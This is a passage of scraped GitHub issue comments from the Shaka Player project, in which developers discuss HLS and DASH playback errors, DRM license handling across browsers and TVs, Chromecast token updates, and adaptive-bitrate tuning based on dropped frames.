https://your.server.com/proxy?token=oRTDazSjdAkvvj8fpC31Vb7QmFS7IhFh54E9U&expires=1520530864 401 (UNAUTHORIZED)\nHope it makes more sense know!. For the first part, yes. That's exactly my case and I think that will solve it!!\nFor the second part I might've not explained myself properly and it turns out I didn't get that from the documentation but from Shaka's demo master/demo/common/control.js \nI meant if autoplay is true and video_.paused is true after loadeddata event is fired it means device might not have autoplay capabilities. And it's been working for me!\nHere's the source,\n/**\n * Used by the application to notify the controls that a load operation is\n * complete.  This allows the controls to recalculate play/paused state, which\n * is important for platforms like Android where autoplay is disabled.\n */\nShakaControls.prototype.loadComplete = function() {\n  // If we are on Android or if autoplay is false, video.paused should be true.\n  // Otherwise, video.paused is false and the content is autoplaying.\n  this.onPlayStateChange_();\n};\nDoes that make sense now? Thanks and sorry for the inconvenience! I'll let you know if token update works!. It works but you need to be careful where you update the license. At first I tried to update on 'caststatuschanged' event fired but it didn't work. \nI'm sure it's due to the fact that by the time the token actually gets updated the playback session already started and failed.\nI made it work by updating when the user presses the cast button. The only downside I found here is that if chromecast's session is canceled from Chrome's button or for any other reason, content playback fails to resume on device. (Since the cast btn on my app has not been pressed.)\nI tried to work around that by updating the license when the following error event is fired: shaka.util.Error.Code.CAST_CANCELED_BY_USER but it doesn't work, probably for the same reason it doesn't work updating on 'caststatuschanged'. \nMaybe the right approach is to update the license every time a new token is fetched instead of doing it when starting - stopping cast. Thoughts?\nThanks!!\n. So bottom line is, updating just when needed is not the best approach and it's clearly not designed to work this way. I'm going to keep license updated and forget about this.\nThanks!!. It's the same behavior you experienced, it launches the receiver app but fails to play the stream. . You're right, there was a miss-communication in the team, headers were missing. 9009 is an error we got a few weeks ago. Right now we're getting a 4032 error, after fixing headers. Can that be due to the .ts chunks? Sorry for the inconvenience.... You're right, there was a miss-communication in the team, headers were missing. 9009 is an error we got a few weeks ago. Right now we're getting a 4032 error, after fixing headers. Can that be due to the .ts chunks? Sorry for the inconvenience.... Good catch! I installed the latest version of mux.js and made it available by adding it to window.muxjs. I now get a 6001 error. I'm forcing https on my localhost, widevine encrypted contents are working so that shouldn't be the problem. Thoughts? . Good catch! I installed the latest version of mux.js and made it available by adding it to window.muxjs. I now get a 6001 error. I'm forcing https on my localhost, widevine encrypted contents are working so that shouldn't be the problem. Thoughts? . @chrisfillmore I'm working on an app that supports DASH - Widevine. I'm sure the 6001  is coming from the fact that the asset has Widevine set up as its DRM by default, just like @kchandran1029 mentioned. For un-encrypted Dash assets, that's not a problem but I'm guessing since HLS and DASH are not supported that might be a problem. I'm going to remove it and let you know how it goes!. @chrisfillmore I'm working on an app that supports DASH - Widevine. I'm sure the 6001  is coming from the fact that the asset has Widevine set up as its DRM by default, just like @kchandran1029 mentioned. For un-encrypted Dash assets, that's not a problem but I'm guessing since HLS and DASH are not supported that might be a problem. I'm going to remove it and let you know how it goes!. @kchandran1029 removing DRM config from the asset worked for me!! I use to get that same log and it turned out it was due to lack of headers in source's server. For testing purposes, try adding the following header to the server Access-Control-Allow-Origin: * \nThanks!!!. @kchandran1029 removing DRM config from the asset worked for me!! I use to get that same log and it turned out it was due to lack of headers in source's server. For testing purposes, try adding the following header to the server Access-Control-Allow-Origin: * \nThanks!!!. @kchandran1029 : I got my HLS stream to work without problems. I tested your stream with my app and I experience the same behavior you describe, I can't get it to play, same error. . @kchandran1029 : I got my HLS stream to work without problems. I tested your stream with my app and I experience the same behavior you describe, I can't get it to play, same error. . @kchandran1029 unfortunately I can't share streams because they're not free, company policy, sorry. \nBut I just emailed another HLS stream that is not working on Shaka, not even in the demo app, but it does work on other players.  . @kchandran1029 unfortunately I can't share streams because they're not free, company policy, sorry. \nBut I just emailed another HLS stream that is not working on Shaka, not even in the demo app, but it does work on other players.  . I've been testing HLS streams from diverse sources and most of them have problems. \nHere are some of the streams I've been testing. Keep in mind all these streams work both with MediaElement and VLC. \n\n\nhttps://kissfm-cires21-video.secure.footprint.net/hittv/master.m3u8 Throws 405 on OPTIONS request. Your server should support Range requests and CORS preflights. Works on and off, refresh and reload to verify. It takes a very long time to start when it works.\n\n\nhttps://lsd2-latam.secure2.footprint.net/hls-live/streamroot_lsd2latam-tectv/_definst_/live/stream3.m3u8 \nReturns error 4022 on both demo and custom app. Never works.\n\n\nhttps://rbtvdiglinear-i.akamaihd.net/hls/live/241719/ATfallback/master_1660.m3u8\nReturns error 4022 on both demo and custom app. Never works.\n\n\nhttps://lsd2-latam.secure2.footprint.net/hls-live/streamroot_lsd2latam-lared/_definst_/live.m3u8\nNever works. Response for preflight has invalid HTTP status code 405. Warns about lack of Range support: Your server should support Range requests and CORS preflights\nError 3016 and 3014. All in demo App. (RADIO stream)\n\n\nhttps://rmtv24hweblive-lh.akamaihd.net/i/rmtv24hwebes_1@300661/master.m3u8\nSometimes works, sometimes doesn't. Huge load times. Your server should support Range requests and CORS preflights. Throws 405 on OPTIONS request. \n\n\nThese are just a few, but there are 2 recurrent error patterns despite the fact that streams were gathered from different sources: \n1 - OPTIONS and Range requests issues.\n2 - 4022.\nThoughts?\n. I've been testing HLS streams from diverse sources and most of them have problems. \nHere are some of the streams I've been testing. Keep in mind all these streams work both with MediaElement and VLC. \n\n\nhttps://kissfm-cires21-video.secure.footprint.net/hittv/master.m3u8 Throws 405 on OPTIONS request. Your server should support Range requests and CORS preflights. Works on and off, refresh and reload to verify. It takes a very long time to start when it works.\n\n\nhttps://lsd2-latam.secure2.footprint.net/hls-live/streamroot_lsd2latam-tectv/_definst_/live/stream3.m3u8 \nReturns error 4022 on both demo and custom app. Never works.\n\n\nhttps://rbtvdiglinear-i.akamaihd.net/hls/live/241719/ATfallback/master_1660.m3u8\nReturns error 4022 on both demo and custom app. Never works.\n\n\nhttps://lsd2-latam.secure2.footprint.net/hls-live/streamroot_lsd2latam-lared/_definst_/live.m3u8\nNever works. Response for preflight has invalid HTTP status code 405. Warns about lack of Range support: Your server should support Range requests and CORS preflights\nError 3016 and 3014. All in demo App. (RADIO stream)\n\n\nhttps://rmtv24hweblive-lh.akamaihd.net/i/rmtv24hwebes_1@300661/master.m3u8\nSometimes works, sometimes doesn't. Huge load times. Your server should support Range requests and CORS preflights. Throws 405 on OPTIONS request. \n\n\nThese are just a few, but there are 2 recurrent error patterns despite the fact that streams were gathered from different sources: \n1 - OPTIONS and Range requests issues.\n2 - 4022.\nThoughts?\n. Yes. I Understand why the 4022 occurs and I expected an explanation along those lines for the Range warning. However, I'm working on a video application were the ability to reproduce contents from all over the web is a key feature, and it looks like there are many streams that don't follow those guidelines. \nI was hoping you would consider adding support for these. I don't always have full control over streams and this restricts the amount of contents that can be visualized by the player, contents that are actually playable.\nIs this something you would consider? \nThanks!   . Yes. I Understand why the 4022 occurs and I expected an explanation along those lines for the Range warning. However, I'm working on a video application were the ability to reproduce contents from all over the web is a key feature, and it looks like there are many streams that don't follow those guidelines. \nI was hoping you would consider adding support for these. I don't always have full control over streams and this restricts the amount of contents that can be visualized by the player, contents that are actually playable.\nIs this something you would consider? \nThanks!   . @TheModMaker I understand, but my point is that somehow other HTML players got around it. For example MediaElement and Clappr. I'm not using Safari but Chrome 66 and Ubuntu, so I have no native HLS support.\nHere is the official demo of Clappr with one of the links that throws a 4022: Clappr\nYou can edit the source on the fly and test other streams too. I tested all the streams I mentioned in this issue and they all work perfectly, thus my reasoning that there's a way of making it work. I have no idea how they did it though, could you help? \nThanks!!. @TheModMaker I understand, but my point is that somehow other HTML players got around it. For example MediaElement and Clappr. I'm not using Safari but Chrome 66 and Ubuntu, so I have no native HLS support.\nHere is the official demo of Clappr with one of the links that throws a 4022: Clappr\nYou can edit the source on the fly and test other streams too. I tested all the streams I mentioned in this issue and they all work perfectly, thus my reasoning that there's a way of making it work. I have no idea how they did it though, could you help? \nThanks!!. Awesome! Let me know if there's something I can do to help! Thanks!!. Awesome! Let me know if there's something I can do to help! Thanks!!. I'd love to see this one #1431. I'm using Shaka in production and I have HLS streams I can't reproduce.  Let me know if you need any help with it! \nThanks!. Awesome, Thanks @joeyparrish!. This should be a good example on how it's implemented: Google CastVideos repo. @vaage I understand how doing that could work, but wouldn't that be a problem when updating Shaka? I was looking forward to a solution that doesn't require me customizing Shaka's code, so I could still update from npm seamlessly. Am I missing something here? Can I add the customization to shaka.cast.CastReceiver.prototype.sendMediaInfoMessage_ elsewhere? In my own code, I mean. \nThanks!. Great! As soon as I have some time I'll work on it. Thanks!. ",
    "marcusparnwell": "@joeyparrish Is there a target date for release of this and 2.2? \nWe are seeing higher rebuffering on shaka player than other players (hasPlayer etc) and believe not being able to set these values is the root cause.. ",
    "tchakabam": "Hey, we have solved this with our ABR manager customization with using a cool-down period and range of parameters regarding resolution restrictions based on period dropped-frames-per-seconds average check.\nI d' like to drop a quick PR for this, as it would really make sense to have this inlined with the base project here.. (of course the solution will not be \"quick\" to make it robust and good quality for general purpose, but based on this spike we can figure how we can generalize what we got here). I signed it!. Hey @joeyparrish \nConcerning Fetch API, afaiu there will be a progress event too: https://developer.mozilla.org/en-US/docs/Web/API/FetchObserver, see onresponseprogress, and we may adapt our API to synthesize the ProgressEvent interface as known from XHRs. By the way it seems that the interfaces of the XHR and Fetch API progress events is compatible if not equal.\nThanks for you feedback! Very good point in fact about the current usability. Well to fully solve that we'd have to map segments requests' progress events to the actual SourceBuffer state I guess. That means for each request you have to know what part of the audio/video buffers it should cover. We currently lack that info in the network engine. But as we have these events from there now, and the info connecting segment URLs and buffer metadata, as well as re-buffering goal parameter, exists in other places, this event might bubble up to a more high-level one giving us actual buffer filling progress. Maybe this PR can be a first step in that direction.\nOn a more hackie way to approach it with what we'd have now, you might be able to just say: OK my segments are 5 seconds long, it is reasonable to set my re-buffering goal to 5 seconds. And then I'll just assume that the audio makes up a rather small part of the whole progress i.e the video being the main thing (it's all application dependent of course), and then you can indicate a re-buffering progress as the aggregate progress events on the first audio and video segments respectively, and weight them by 90% vs 10% for video vs audio respectively. That would give you a good indication of the progress anyhow. You may go even further and us the streamBandwidth from statistics and calculate that in against the audio bitrate (which may be 128k anyhow) to achieve a more precise audio vs video bitrate ratio estimation. All this relies of course on knowing your segment duration (which should be constant) and the re-buffering goal where you evaluate the progress events.. @joeyparrish Clear for the test, will write them now as you seem to say it is OK to make this contribution. I'll come up with some usage examples, I believe it is possible to provide some usable (event if fuzzy) presentation even when re-buffering goal is larger than a segment. . @joeyparrish added tests to networking-engine and http plugin. for the offline and data-uri plugins, what should we add here that will be really helpful?  since we wouldn't have any async progress or so? compiler doesn't complain, at least on my local environment. can you confirm that? best regards. @joeyparrish sure, will do that. With the event data and player state we currently can combine we can actually get a meaningful display of what is going on network-wise. I have been testing it with 3G network conditioning for example, and I think it proves to be quite useful. It looks a bit hectic when used with really short segments. We could avoid that by looking at the video element's buffered TimeRanges and the stream bandwidth to rather have an estimation of progress until rebuffering completes. Otherwise, what would be really useful would be if Schemes' would have, in the case of SEGMENT type requests, metadata of the segment, essentially the duration, which would allow mapping it to the rebufferingGoal and/or TimeRange objects.. @joeyparrish yes totally agree on your feedback, i noticed that too. that's pretty much the direction i'd go as well. proper progress indicator needs the context of segments and buffering goal. the application should get a more high-level event type that will allow to easily build a progress-bar that will work against the actual buffering goal in the time domain.\nthe current \"moving backwards\" is caused by the fact that the current display i built aggregates the loaded bytes across all pending requests. so when a request is added while one is already pending (like when fetching audio/video as seperate segments) then the total bytes amount increases, and the bar \"moves backwards\" because the ratio of loaded vs total bytes goes down. so it is really because we are showing progress against pending bytes vs actually using time-domain progress, which we would do with the approach to dispatch events via streaming engine as you proposed.\n. OK, so what I did is that we are now tracking each request (now ref is passed via net-engine progress event), and thus we are tracking per content-type a the bytes loaded during the buffering state of the player. When we are not in buffering state we dont dispatch the events and dont keep long track of the requests progress. We these trackers we can then make an estimation of the media-time loaded until now (assuming constant bitrate basically, will be more precise with shorter segments, but is precise over the segment length of course).\nUsing the media-time downloaded estimation vs the buffering goal works really well to display progress I find.\nOne could also display progress for audio and video seperately where appropriate.\nSo, I think we have something really going into direction of useful now. I have tested it with 3G emulated network and it was looking pretty good.\nIt certainly can be improved in certain cases. For some reason at startup sometime the bar doesn't go until completion, i.e we start before it expects to finish :) \nThis is kind off in a prototypical state, I haven't added tests or proper docs yet.\nI just wanted to check wether we should keep going in this direction before adding these.\nBest,. @joeyparrish was wondering if you had any feedback on this? :) . @TheModMaker Well, you shouldn't be sorry in fact \ud83d\ude06  I am rather sorry for you that you haven't been able to leverage my effort somehow. \nHopefully we can improve our efficiency in collaboration somehow in the future? \ud83d\udc4d What do you suggest?\nIt seems to me that my initial idea wasn't bad, since now you are actually needing it for several other purposes. What was the reason we weren't able to continue on this? I agree that too many conflicting changes made this patch here obsolete, but I guess there was also a lack of interest in this feature until https://github.com/google/shaka-player/issues/1051 came up? Why?. mux.js is probably a really good choice! great to hear that, looking forward to TS-based HLS support in Shaka!\nDo you see the need to run the transmuxing inside a worker script? This is how it was done in Hls.js and also in videojs-contrib-hls.\nSo in my experience transmuxing, parsing the TS, and building/writing the fMp4 is rather effortless task (it's not like decoding anything or so, \"just\" read/writing container data). We have been doing this for audio streams, but of course with video it will generally be a higher data throughput.\nBut it's probably better to not do this on the UI thread still :)\nI have been building a library for transmuxing, that currently supports output of MP4, but the usecase it was tested with was only MP3 (for HLS with MP3 elementary streams playback on Firefox, that only accepts MP3 when contained as fMP4, Chrome does support Mp3 \"elementary\" btw). It is a general pipelining framework with parsers, demuxers, muxers, etc.. It's a bit GStreamer inspired :)\nIt also supports running stuff in workers. The mp4-packager was based on a Mozilla experimental project under Apache license. \nSee: https://github.com/tchakabam/multimedia.js\nThere is also another great library for reading & building MP4 data: https://github.com/madebyhiro/codem-isoboxer\nand here is a node-based Transport-Stream parser which even seems to be DVB-T compliant: https://github.com/mkrufky/node-dvbtee\n. @joeyparrish If you are still looking for Hls.js know-how, I have been contributing a bit to it :) So you can shoot me your questions if you have any.. Note that there are a few debug logs in there, and no docs yet, linting/compile will surely fail as well. Only tested in uncompiled mode. \nThis is to give a base, to see if this approach gets positive resonance, and if yes, docs and format will be added.. in order to test this and cause some frame-dropping, i can recommend the stress tool: http://manpages.ubuntu.com/manpages/trusty/man1/stress.1.html. @TheModMaker quoting you: But I don't think we should be guessing the capabilities of the device explicitly. Since a number of factors can influence dropped frames, it would be better to treat this the same as the network. Namely, if we have too many dropped frames, we downgrade. If we don't have any dropped frames for a while, we can allow upgrades again.\nIn case I did understand what you mean, it is in line with what we are doing in this PR. More precisely, how do you suggest should we abstract away from the specific device capabilities?\nI understand we should not set fixed max-pixel values. The defaults in this PR were kind of an p-o-c example. How about one would allow to lib clients to input as configuration a set of pixel-values, over which we up and downgrad as you suggest. For this we already have added here the concept of DeviceCapacityLevels. We can rename it to Capability if it is a more consistent term in this context.\nGenerally, the dropped-frames detection and the handling should be disabled by default, it might cause unexpected behavior - but when running this with specific content like full-HD and 4K streams on a range of devices that may have issues with decoding, it would be great to be able to configure the behavior to ones needs and enable the watch-interval.\nThe idea of using a moving average for smoothing the dropped-frames measurements is a good one I agree! That's exactly what I meant by adding more advanced means of generating a decision-driving signal.\nAlso, was thinking the same about playbackRate, we should probably give the ABR manager access to the Playhead instance?\n. > So rather than having explicit regions, I suggest adjusting to the next lower track.\nYes that makes much more sense and will universally work from a control systems pov.\nWe then also need to have the exponential smoothing in there to make it stabilize.\nAlso agreeing with all your other suggestions. Thanks for the valuable input on the solution here.. yes but we should move this towards the direction as discussed with @TheModMaker here. his comments make more sense than my initial approach here.\nI will soon modify it in the direction of not restricting on preset resolutions, but rather have a control-system that switches bitrate up/down upon extended period of frame-drops detected by the exponential moving average. \n@TheModMaker I figured the smoothing filter will also be good to cancel out high short spikes that might happen on any machine when one moves around windows or other stuff that happens in the background. we wouldn't want to switch down on that but only if there is a prolonged dropped fps rate over a certain time that does not go away.\n@hyurtseven81 great if you fixed linter things! could you commit that please? :D :+1: . @forbesjo interesting. that is something we could eventually fix via the polyfill (which we already use in this library to enable webkit-prefixed dropped/decoded frame-count) by keeping a count in a reserved property in the video element itself.\nbut then again, we may not necessarily need it, there should be some kind of differential sampling of these counters going on, so that a reset should not matter to the overall estimate. especially if there is a seek happening, potentially we are starting on a flushed buffer and can assume different payload properties yielding different decoder behavior.\n. generally about the solution to this: the previous approach here is not yet what I think is what we should do. \nthere will in fact rather be a scalar dimension for \"video quality\" that should be proportional to the number of decoded frames and the total pixels decoded per frame. when frames are dropped, the quality estimate will drop (smoothed by the ewma, just like for the bandwidth).\nthen the ABR algorithm should optimize for highest quality possible, just like it already optimizes for highest bandwidth possible. to do so it will have to choose resolutions such that they fulfill a condition against the quality estimate (anologous to how we choose variants by the bandwidth estimate).\nwe are currently working on a such a direction for a solution to this.. @itaykinnrot +1 exactly what we observed with many HD+ and 4K streams, CDM processing creates a bottle-neck on certain hardware configs... It would be good if Shaka could detect this, and generally solve the problem of \"hardware capabilities adaptation\" - while browser API that tells us better about CPU / GPU resources still needs to be spec'd :)  . @TheModMaker Hey, yes, this is an actual issue, and I would like to continue to work on a solution for it. I hope thanks to your reviewing we can get it to an actual patch to master this time \ud83d\udc4d I had interrupted these efforts as there was a lack of response from the maintainers side here from my pov.. @mimse Hey, which issue exactly are you seeing in Chrome? We don't see any issue with Chrome in plain Shaka and the CL hybrid-format. We get an error on Edge/IE browsers though, and this pre-processing of the fragment avoids it.\nCan you better explain your use-case or issue? I believe I miss some information. I don't even know which issue you opened with Castlabs? Where? \nWe are operating independent of Castlabs on this.. @mimse But anyway, looking forward to collaborate with you guys on this in any way possible to have a common effort on the player technology ;). @mimse I used to work for Castlabs but that was back in 2012 :) For further questions, I sent you an email!\nDo you also use the DASH-Smooth-hybrid format that Castlabs offers?. Ok understood. This patch here for Shaka adresses a different case I think. Pantaflix gets delivered a hybrid format with MP4 fragments that can be used for both DASH and for SmoothStreaming. This approach is supposed to save storage and CDN origin traffic. \nThe \"hybrid\" approach also implies the issue we are fixing here, as the fragments need to contain two types of boxes at the same time that are specific to Smooth and to DASH; Browsers IE and Edge do not like that :) \nIn your case, you probably get \"pure\" DASH MP4 fragments (just a guess, no idea), which only has CENC specific boxes, since you already have the Smooth delivered elsewhere. Thus, you don't have this issue I think. We can chat about the other issue you have somewhere else ;). Hey\nAwesome pointer about the response filter. I wasn't aware this concept already existed at that level.\nI totally agree this is the best solution, and ideally this is done on the networking engine level in fact.\nThanks for the input and quick answers! :) We eventually can close this PR in that case.\nIt is in fact also better to have a generic interface like the response filter, and have the application inject these \"adapters\" it may need, instead of having to modify the Shaka code to do this.\nJust one more question: How about the Shaka MP4 parser being exported, s it is possible to rely on the Shaka MP4 parser when constructing the response filter? Currently it is not accessible from the public API if i see that right. \nOtherwise, one can use other MP4 parsers out-there or build an own light-weight one, but being able to use the Shaka one would be \"nicer\" :) . Alright, sure, could have that checked that on my own, sorry.\nI was under the impression that for something to be exported it needed to be declared in the externs folder. Still learning my way through the closure toolchain :)\nThanks for the help!\n. @chrisfillmore @TheModMaker @joeyparrish Are you guys familiar with this implementation of Fairplay certificate/license flow with the webkit prefixed API? \n---> https://github.com/chemoish/videojs-fairplay\nIt doesn't use MediaSource for playback, but relies on Safari built-in HLS support (which makes it necessary to side-load webvtt for subtitles).\nAnyhow, maybe a good comparison point for seeing how it can be done!\nI am also very interested at making this effort here advance, and am happy to contribute any kind of work if needed :hand: . Totally agree with all of you! :) \nShaka ideally would be a MediaSource data-provider engine in the first place to do adaptive streaming on the app layer. Most of it's purpose will not be useful on Safari when the built-in HLS streaming engine will be used.\nWhat is needed to do FP 1.0 on Safari via src URL is only a Fairplay license/cert request building - and that is where I thought it might be useful for Shaka to mimic that from the videojs example, but I didn't realize that via MediaSource we need another version of FP - which doesn't seem to be yet widely usable.\nSo what is needed to play FPS 1.0 HLS on Safari is really mosty something that is built quite easily around Safaris prefixed EME API, independently of all the other objects Shaka lib provides imho, and independent of MSE. But then again, there is a good overlap on dealing with EME and its prefixed APIs etc as we can see :)\nMaybe this is also a way to expand the purpose of Shaka to become a more general purpose HTML5 playback \"toolbox\" library? \nFor example, one can still record playback stats and currently played resolution on Safari (via video.videoWidth/Height props) even though it's not possible to drive the quality switches ourselves.\nOr one can watch at buffered time-ranges to check out buffering progress/speed, or even extrapolate download speed underlying. Etc .. It can be interesting to abstract these things under a common API.\nAlso: For HLS FPS in Safari, side-loading and decoding/rendering or text-tracks is necessary :) That's something where Shaka components and it's track switching API comes in very useful imho.\nOf course I also think it will be useful to show certain console errors or throw exceptions when developers try to use Shaka methods that are ineffective on Safari.\n@joeyparrish What is the current state here on FPS 1.0 and what is lacking to make it work? :)\n. ",
    "jbauman2": "Yeah, that's right. And in the future it will prevent Chrome from using\noverlay to display the video, which save even more power.\nOn Tue, Apr 4, 2017 at 9:52 PM, Joey Parrish notifications@github.com\nwrote:\n\nAs I understand it, this also means the demo app is consuming more battery\nthan it should on mobile devices and laptops. Is that correct?\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/749#issuecomment-291753661,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AAruj63Ye3-MYV41Zh9-A4VbASoLmxQaks5rsx38gaJpZM4MznnX\n.\n. \n",
    "Canta": "Thank you very much joey for the quick answer.\nUnfortunately, that's what our content provider gives to us; we have no control over the manifest creation.\nDashif player does not have this problem, but it fails with LIVE content (not VOD).\nSo, our workaround would be to use one player for VOD and the other for LIVE.\nWe would love to use Shaka for every use case. \nIs it feasible to add in the future some configuration in Shaka for this use case?\nMaybe some way to conditionally modify the manifest? (We could remove the widevine pssh data when playready is in use).\n. Thing is, we have various providers, and just this one sends the assets proccesed this way. So, is not just a \"if IE\" or \"if Playready\", but a series of more complex checks before we could tell Shaka what to do.\nThat said, I think the second option would work.\nAs I understand it, the first option would require us to get the data, changing it, and injecting it into shaka. I guess it's technologically possible, but it would require us to implement the logic for detecting and getting the first chunk and then parsing that and converting it to a valid manifest tag, which in sum of the other checks would be really cumbersome.\nGiven that you're so willing to consider a change in Shaka in order to help us, i'm wondering what could be the problem with just changing the actual behaviour of not checking the first chunk for playready when widevine pssh data is in the manifest. Isn't it simpler? Or this means trouble for somebody? \nAnyways, if you consider this to be a problem, then we could work with your second option.\nThanks.. Sorry for the delay.\nYou are correct about the manifest, that was my mistake. And, yes, an option for disregarding manifest data would be very useful for us. \nThank you very much.\n. ",
    "MichaelZaporozhets": "We implemented this by building a 'stream merging' api that normalises and concatenates mpd sources into a single stream available as hls & dash on the fly and passing that as the source for each. \nThe code is a bit of a mess but it works well. No reason the input can't be amended to support hls streams too. \n.following. ",
    "tdaines": "+1 for this.  Will getAudioLanguages() and setAudioLanguage() also be modified so that an English commentary track can be selected when the main track is English as well?. Great thanks.  If you prefer that to be in a separate issue I'm happy to make a new one.. @joeyparrish How do see audio track role coexisting with the label attribute being added by PR #811?. Great, thanks for the update @joeyparrish . @vaage Anything else you want me to take a second pass at?. ",
    "geniusq1981": "is this bug fixed in 2.3.0? but I still meet same error for some URL : \"Unable to guess manifest type by file extension or by MIME type. undefined application/vnd.apple.mpegurl;charset=utf-8\". ",
    "gigon": "Regarding 2015 and 2016 SamsungTVs: \nthe implementation of EME v0.1b is incomplete/incorrect:\nTizen\u2019s video element implementation declares msPrefixed EME methods and events. \nThat\u2019s the reason Youtube test page and Shaka Player support page report positive.\nBut the implementations are empty, and I get an empty challenge on the license request event.\nIn addition, the drm engine seems to support Playready, and not Widevine as advertised:\nyou can play Playready DASH (and HSS) content in a \u201cnative\u201d Tizen application,\nwhich is an Html + Javascript application that calls native Tizen Javascript Extensions, and can be developed with the Tizen IDE.\nNote Shaka v2.0.1 introduced a fix for Toshiba TV, which seemed to have similar problems with eme v0.1b.\nBut unfortunately it doesn't fix the problems for Samsung TV.. I signed it!. I signed it!. @vaage The issue is not about playback, it is about download.\nAnd it does get downloaded fine. \nThe issue is about the optimization where the application has the certificate beforehand (e.g. by downloading it), and feeds it to Shaka library, which calls the widevine (EME) function setServerCertificate before creating the key sessions. \nThis prevents getting a \"key message\" event from the CDM that requests a widevine certificate, \nbefore the event that requests the actual license.\nThis optimization is demonstrated in case of playback, but in case of Download (and also in the release of a persistent license!), the demo application does not preload the certificate I set in the Custom field. \nYou can see this by looking at XHR requests in the chrome debugger.\nIn case of streaming playback you get only one request to our license server.\nIn case of Download or Delete you get two requests.\nI added code to the demo application, to preload the certificate, in a Pull request I submitted.\nBut later I saw that Shaka library does not call setServerCertificate at all in case of Storage session. \nIt calls it only when a video tag is attached before playback.\nPlease correct me if I misunderstand.\n. Looking deeper, I see that you already store the certificate itself, so no need to retrieve an original certificateUri and get a certificate before calling Storage.remove().\nIt seems the drm_engine should be fixed, to use this certificate - both in Store and Delete operations.\nCurrently it only calls setServerCertificate in the attach() function, when attaching a video element.\nShould it call setServerCertificate, in the function initForStorage? \nSo please ignore the 2nd commit 03759600375960, it should be modified and extended.\nThe 1st commit is ok.\nBy the way, the current 250-beta-master branch has other Storage related errors. \nSo I should probably not base on it. \n. > you can store additional information alongside your asset using the metadata field\nYes I know. The problem is that Shaka always uses the originaLicenseUri for sending \na release-license request. It ignores a specific configuration call made prior to calling \nstorage.remove(), e.g.: \nwindow.storage.player_.configure({   \n    drm: {\n        servers: { 'com.widevine.alpha': myLicenseReleaseUri } \n    }\n});\n. Thanks  @TheModMaker , I resolved the issues.. Sorry but someone modified the license proxy after I posted the bug (as it\nwas many days ago...).\nI am sending now the correct urls to shaka-player-issues@google.com.\nWith these urls I can reproduce it also on the nightly build.\nNotice: it does play! you have to let it play for 5-10 seconds until you\nsee the shaka error message on top of the playing video.\nOn Tue, 27 Nov 2018 at 23:33 Jacob Trimble notifications@github.com wrote:\n\nThis is usually caused by the platform rejecting the content, and there is\noften nothing we can do about it. I can't reproduce this on our Windows\nmachine. I get a different error and the video doesn't play at all. Could\nyou try with verbose logging and post those logs? Did you try with the nightly\nsite https://nightly-dot-shaka-player-demo.appspot.com/? Can you also\nlook at the error object to get extended error codes, I think it will be in\nerror.data[0].errorCode. You could also look at\nlib/polyfill/patchedmediakeys_ms.js and look at the onMsKeyError_\nfunction to see if there is any more info in the native error object.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/1689#issuecomment-442225368,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/ABv9wYCizBaH4VuuNZ_9AJVTl3C7Bwqkks5uza_FgaJpZM4Yq-CC\n.\n. @TheModMaker, please explain how come the same asset works fine, including audio, on Edge browser, \nif it has a bad PSSH box? \nAnd: do you have any reference Playready content with separate keys for video and audio?\n. OK will fix.\nBTW I did run all.py (or check.py) and it does not trap this violation.. \n",
    "raeesbhatti": "Thank you @vaage, I think this is exactly what was needed. I'll look into it.. ",
    "codegastudio": "This working like that\nimport * as shaka from \"shaka-player\";\n...\nshaka.polyfill.installAll();\nI think than i had a cache problem the previous time :/\nThx @joeyparrish \nWhen in doubt, reboot. ",
    "ZmGorynych": "@joeyparrish:  urn:mpeg:dash:sea:aes128-cbc:2013 is the full-segment AES-128 (\"Pantos\") encryption used in HLS. The URN comes from MPEG DASH Part 4, which defines DASH interface to AES-128.. ",
    "sivarajendranaidu": "Please find the License Server URL for Playready:\nhttp://115.119.242.24/drmclientproxy/playready/get_license. @joeyparrish thanks a lot your support. With reference https://github.com/Dash-Industry-Forum/dash.js/issues/1615 this issue seams to with Edge Browser. Once we update the Windows (Edge Browser > 38) it worked well with our Shaka Player.\nHence its not our player issue. ",
    "TheJohnBowers": "The corporate CLA has been signed according to my knowledge, but it was initiated by Kris Varro in March.  I believe our corporate CLA should have been signed and accepted as of March 19th.. Ok, I believe I have been added to the corporate CLA now.. I would like to see some form of this get in.....   What do we think the status of this is?   Are we just waiting for the contributor to make the requested changes.   Also I am curious about what appears to be adding ms:laurl support for widevine.   Is this specifically something that is likely to make it into shaka?. Having autoplay disabled does not appear to affect the behavior at all.  Sometimes you will end up with a paused video and a media error.  Sometimes you will end up with a paused video that you can start.  It still seems to have to do with how long it takes to get the license.  \nI cannot see a correlation to what segments have or haven't downloaded by the time the license is acquired.  Additionally I would say the same problem occurs with the VDMS assets which don't actually have ANY unencrypted segments/portions.  I didn't actually check the Axinom asset to see that it had an unencrypted segment, but since you are asking the question I assume you believe that it does.  If it is different than my fully encrypted assets that difference doesn't affect behavior. . It seems to me that the license acquisition definitely happens after appending media in both instances.  \nIt should be reasonably easy for you to reproduce unless your connection is so lightning fast that you never see acquisition take more than 200 ms.  \nIf you need to test playback in a virtual environment, I have discovered that you can add a playenabler to the MS test license server that allows VMs to playback when normally they would not be allowed.  I am not sure if Axinom's license server supports it, but if it does, perhaps modifying the license server acquisition url on the axinom assets to something like this:\n'com.microsoft.playready': '//drm-playready-licensing.axtest.net/AcquireLicense?PlayRight=1&UseSimpleNonPersistentLicense=1&PlayEnablers=B621D91F-EDCC-4035-8D4B-DC71760D43E9'\nwould allow for testing in a VM.\n\n\n. Never mind on the play enabler thing.  That argument works on the MS test playready license server, but I was trying to get it to work with the Axinom assets and it doesn't make a difference.  So their license server must not accept it.   I can still see the MEDIA.VIDEO_ERROR(5,8004b896) sometimes, but I also see a MEDIA.VIDEO_ERROR(3,c0262500) which I don't see with actual hardware. \nI cannot get their assets to play back in a VM.  So I guess it is important to say that I am doing my testing on actual hardware running windows 10.\n. Yes, I see it on real hardware with the Axinom assets.  Since the demo has the Axinom assets already, I expect anyone to be able to reproduce the issue I am describing here by using the existing code on an actual hardware. \nI see additional failures trying to playback the Axinom assets on a virtual machine.  I expect this is because the license returned is not allowing playback on virtualized hardware.. Thanks!. @joeyparrish -- Yes, I can play the Axinom content.  It behaves the same way with your nightly as it does with any of the other versions I have checked.  I suspect there is some reason a 